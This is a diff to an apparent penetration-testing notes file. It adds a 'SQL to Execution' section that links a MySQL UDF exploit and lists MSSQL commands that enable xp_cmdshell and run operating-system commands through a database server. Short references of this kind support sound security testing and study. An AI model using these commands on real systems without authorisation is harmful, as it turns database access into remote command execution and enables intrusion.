@@ -41,6 +41,21 @@ SQL Injection
 -------------
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
+SQL to Execution
+----------------
+MySQL UDF: https://www.exploit-db.com/exploits/1181
+
+MSSQL:
+
+    EXEC sp_configure 'show advanced options', 1
+    RECONFIGURE WITH OVERRIDE
+    GO
+    EXEC sp_configure 'xp_cmdshell', 1
+    RECONFIGURE WITH OVERRIDE
+    GO
+    EXEC xp_cmdshell 'command_goes_here'
+    GO
+
 Port Forwarding
 ---------------
 Use pfwd (.py or .go) from this repo. Note, you can cross compile easily with go to make a Windows port forwarding executable!
